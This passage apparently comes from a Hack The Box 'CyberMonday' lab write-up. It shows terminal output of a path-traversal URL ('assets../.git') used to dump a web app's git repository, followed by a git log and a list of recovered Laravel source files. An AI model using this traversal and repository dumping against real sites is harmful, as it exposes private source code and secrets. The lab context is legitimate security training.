[-] Already downloaded http://cybermonday.htb/assets../.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322
[-] Fetching http://cybermonday.htb/assets../.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://cybermonday.htb/assets../.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/objects/f4/39e6a6a358e6effbc092f837e88311ce3e6712 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/1f/3c7668f747b71eafcb4b178d1a80511d56e80a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/a3329b183e042b14516122b5d470bc337a5a90 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fa/579600b150dfe96277f923c509bc473517b32a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/b6/10c22de02a2611915648294317192109b07aa8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/bc/67a663bb443bbace06a0a47247273172f9a8e6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/79/f63b44fdcb02187831898cd3732301fa3b7488 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/51/0d9961f10a033fa6a602129eb0e24ebe32e146 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f1/71ecacc26252f4ba333eb804883e6f01e376aa [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/16/71c9b9d94ae80b2d39c6b6a64d154b0ac6cb65 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9b/b1bd7c48ab8b42c23bb04b3b2c610acad26c97 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c7/788b180e2a7e5bc14c2ea9e02f9d1de42ac29b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c6/4c292d6315c747bb7d85134967ae9ba0663e47 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2b/5249110fbf73b9bc29d730553577c1328efda2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e2/63f1e758191182a3ec57883b93e2dfe77c5e3e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7a/9aecdf303df17e84c167d05c5d6cdd66981d23 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2a/c86a1858718f2ae64117738c11442ea18dbdfd [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/03/d03b489802641c86ab6f275af99f949539f6f7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/24/25237e3360e056e6e6705323b819a136a7ed9b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a9/b549189653697bdcc2597e2a81e93fae10cea6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/63/bcc82bf5ceaed53668404c7e8ca286c5f68182 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/078294b451e1385fcac6ffc7518bd40128a589 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2a/22dc1206aefa36f8f32a6839219094d7acd0c1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/03/7e17df03b0598d7bbd27ed333312e8e337fb1b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/96/233b34ccba706a9f89dca87a9282a3cd836e0a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/08/ef22210ae6291c9a7c25136b050379fc968124 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0c/74c2f4d4e86e8483c8a2ac0f6d8ffff146cc4e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/31/e5659f5ea47800d8b803c2b8d7b8d5127c70fe [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a2/09be995d70299741d5f4703f5d0a371ba51906 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a5/ca4ad59b1f94c8c49d41cdb8527b9026126cca [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a7/666dbc96dabf9121c7ab100b75351032e876f2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9b/19b93c9f13d72749cc3bac760a28325116f3f1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/84/061fffbb46a150363c7d3ede8d8e903fc3873c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/372d054b30cce0b5356c375737a79d87ef69e7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/62/b6ea2ab9c84cbbfb776b430c307dc508e2642b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/fcbbd6c89c6deaa0ffc3bec50d66a36406718a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/c6cee7c19c410449b5b9458bde053ae8f5bda0 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ef/76a7ed6aece96a22282683c9832f658d41dad7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/33/bb29546eba5501bb91ab41199cce5c86ffcdf5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f2/c31ba3685cf854c57fa5bb1565f86dc46630c6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8a/39e6daa63dd3a4c07693f728ff136c05a3ed6e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/d9dbdbe8ad384c1ea73b5f06bf9b9daa18007d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5a/a1dbb78815158ce20421d5099ede9b965e0a26 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/bc/d3be4c28aa78fdc11f52b699718fd14fa3fda9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/25/ea5a819352e0fa8bacc367dd0cb39b71292c4f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/52/9cfdc9916c1bd990016e2d8789895873908548 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/53/4395a369bf31a7cc4da747887882588bed258f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/ce530e8d25451c7caf81ebdecac2cca9a77d83 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/28bbf33e1cced57eefe573bb6371d6d871c0db [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/22/b8a18d325814f221fb0481fa7ab320b612d601 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/ed97c014194eee5a0d02fbf61d93b17162402a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3a/ec5e27e5db801fa9e321c0a97acbb49e10908f [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/1d/69f3a2890599c4f51f93e1906f44d64f5eb928 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/eb/0536286f3081c6c0646817037faf5446e3547d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/90/50e10b0988351ff02412e2a3eb2d77cd982c48 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9f/64856f645658aeda1c3d6a07b544e550097f70 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3f/ad2cd925b761af3387f47d5ed471a0bddc690e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/42/87910964feb86119d87658b97ff556ac06d585 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/22/57b3b323f34bdf71cc9c43977661c7d54b2e6c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3c/f5e09286183fa233fe39d26dad9f902fc1c69e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/eb/6fa48c25d93f7bf753ba612cd2c7efecea5f4b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5d/451e1fae88c81c097aa55de6ff039a3cc0a1c3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e0/5f4c9a1b27a35c20ac897b44dfb7a9238ff9b7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/34/28efe948369749e99dba20560cc28211e069f1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/54/7152f6a933b1c1f409283d7bdfe1ba556d4069 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f2/d718fb4f64af26296e2d5fa4ae4dee04aee886 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/95/47e7d7740a164f5fd6f10aec0d0d98ed09e23e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/29/32d4a69d6554cec4dea94e3194351710bd659e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/82/a37e400815ec871d3b88cc2f08a67740cec161 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d6/b7ef32c8478a48c3994dcadc86837f4371184d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/bc1d29f0ca5533beb6106f170b14fce854269d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/51/b351b0b3527e399cbbeb9d1361af9ba03fbb9e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/70/46c26a14dfd083b613b04e5fb464c1b8f05a1e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/39/5c518bc47b94752d00b8dc7aeb7d241633e7cf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/abca19f99f35ce39fc788f7070e2b9bc0d3108 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/90/bf9ee57364b1e707fb400a8561c6f0083af928 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ee/8ca5bcd8f77d219f29529a9163587235c545d5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7d/5e9e15b9429f0f49c4d4e00e55d820260c5179 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ea/87f2e57d00c8b5176c144e2d6c58e43f0eace8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/12/396722a79274d3caa3afff8b0fb2477d905957 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ab/8b2cf77bbfa9c44bc228e2b71c2fed039d8e43 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c8/e7f76ffb52fc942e3de0a9dcc5261e051d76bf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fd/235f8c5d00c8c9925db3a06aa197d172279ec3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fc/acb80b3e1193e661cb1ca5f589d80af218867d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/17/191986b47f67e56c7e34e306ffe1f236501fb6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0b/2c367981682764972ef92d67a6278f550c9f42 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ab/0a1c2c7005cd000efabbcc3919dbc78e4b0f5d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c1/c48a060cf65c15925509e53589835c3bf451d2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/23/b61d24286d5e2ad9b01ccc2cef12511a0d835d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/65/98e2c0607332658ab9d429e86b2da1130f2326 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d4/8141187786931ec2cf8645e384be7878c7dc53 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/23/45a56b5a6927a286e99ff80efc963ea3422e0c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/17/eda1fa63d2bdeefffc7f2464990bf333d54906 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/72/4b5ace57ad1b9a16bd3b579c665e9d26ffb0be [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/69/22577695e66ffdb3803e559490798898341abc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/40/c55f65c25644d4f09d3c734b219a2aa736b134 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f0/0a628d46a5fb12ee6f4fb81647ad94ded4246c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/3e4a3f9c394c636dcf0fe673ddb42c2fa180c3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e3/dff6b7c1c86ad0a72845e554d4fffecff9f6b5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0d/89369b949acd2a875803a672e48b3169a74339 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f4/21db2c26bd69264849c992e70e529fde0704ea [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/47/3deba1cfc7d8eb1624b0a3f677b8b7f7837da6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0e/d15f710f3fdd9cd4255795cedb4f4e61aa59e8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/ba/ba3681999751b0d1d2139aa2817dc730608f0e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e7/3b8366158995ef7dd236f7119db0641931b358 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/5a/0039662c1d3823d77d2a0bff5088f68a8ce54a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a8/73d608f3ae94f0bd8243a9573d627660c48bdc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/b5/a448dc774d545609f3ee8a166a4eeef01f33c9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/93/6d9ad1901c231d7f5359dbd5ecdb2b3345675e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7f/2e2c6ec8c31bec764d3c5d3bb5dd5d1bedd27d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/05/c4471f2b53fc17d3cac9d3d252755a35479f7c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/32/e46a3cd15b9aa54cccc46fc53990f382062325 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/4803c05638697d84ea28d40693324ec70f7990 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/6c/430293cc349a751385d7f0863c64bf5e0a045d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/78/ccc21f46a8df7435c5514691eb821a04b28aae [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e5/c5fef7a07c827e882cbf83ae5403c7e911cd3c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a9/a0f5fdd85154a13d07e4cda8f22303cac53cb9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e4/0faa0b1f8931c144b8ff7fdefa17583d7681f8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a0/a2a8a34a6221e4dceb24a759ed14e911f74c57 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/46/4c26155d71f0317cf3113d1d18dab569a401f0 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d2/5e46f9de6d52e2c5682604989a1bee56af30d7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/f3c9029c202012a5a0a3cff159d47cb4f3beab [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9e/b7bd2831e242775751b2c54dcc52fe92dae34a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/70/4089a7fe757c137d99241b758c912d8391e19d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/bb/9945c3b6ed4d3d4c9afde3093f51d3ab4c3ad7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3e/c37a22439b3c9be8e85e4cca5e5666cd0cbd53 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/74/cbd9a9eaaaf10a0a748f707729e62c8ce4b05c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/86/7695bdcff312bfa221d583e2b3223aab2426dd [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a2/813a06489f33806916684e1b8bbf2795aba5eb [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/88/cadcaaf281f473a7d03d757be46a6d1d307eaf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/71/86414c65794159f1a16a052921c44130463b4e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/33/91630ecc9e859dad35834a43f119a67bb7df71 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c8/3d34aaaf8706bd525ca4dc35c0348332c65774 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/6b/0afd0b51ad8dacac31ce7e316398ec4c3e4b82 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9e/86521722b083582f0f100e7b4d3a63bcc1bdfc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0a/8a4d32f60dbb9941b88ed67b521f5cab4eac36 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/4c/573f4f204dbc36ab70a67606f366646a91344e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fc/87b2971c5cb8fd6b25032d093d71513d06d07a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e4/6045ac8b2c25fb9a5779dd86e27d7daac8d08e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/96d67d71fbda2243b3ca9b41603a3215eab1b7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d0/04bbfe4a971a42548db1c28022ad83a5fe7bed [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/91/a63d8dd88b90cc6cedd501364440527c7bca9a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/01/e4a6cda9eb380973b23a40d562bca8a3a198b4 [200]
[-] Running git checkout .
```

```c
$ git log
commit f439e6a6a358e6effbc092f837e88311ce3e6712 (HEAD -> master)
Author: guest <guest@mail.com>
Date:   Tue Jan 24 01:51:33 2023 +0000

    backup
```

```c
$ ~/opt/01_information_gathering/GitTools/Extractor/extractor.sh . ext                          
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: e1a40beebc7035212efdcb15476f9c994e3634a7
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/bulletproof.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/animate.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/custom.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/flex-slider.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/fontawesome.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/owl.css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/css/templatemo-woox-travel.css
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/images
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/images/banner-04.jpg
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/images/cta-bg.jpg
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/custom.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/isotope.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/isotope.min.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/owl-carousel.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/popup.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/js/tabs.js
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-brands-400.ttf
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-brands-400.woff2
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-regular-400.ttf
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-regular-400.woff2
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-solid-900.ttf
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-solid-900.woff2
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-v4compatibility.ttf
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/webfonts/fa-v4compatibility.woff2
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/dashboard.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/index.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/login.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/logout.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/magick
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/register.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/bootstrap
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/bootstrap/css
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/bootstrap/css/bootstrap.min.css
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/bootstrap/js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/bootstrap/js/bootstrap.min.js
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.min.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.min.map
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.slim.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.slim.min.js
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/0-e1a40beebc7035212efdcb15476f9c994e3634a7/vendor/jquery/jquery.slim.min.map
[+] Found commit: f439e6a6a358e6effbc092f837e88311ce3e6712
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/.editorconfig
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/.env.example
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/.gitattributes
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/.gitignore
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/.styleci.yml
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/README.md
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Console
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Console/Kernel.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Exceptions
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Exceptions/Handler.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/AuthController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/ChangelogController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/Controller.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/DashboardController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/HomeController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/ProductController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Controllers/ProfileController.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Kernel.php
[+] Found folder: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/Authenticate.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/AuthenticateAdmin.php
[+] Found file: /media/htb/machines/cybermonday/files/dump/ext/1-f439e6a6a358e6effbc092f837e88311ce3e6712/app/Http/Middleware/EncryptCookies.php
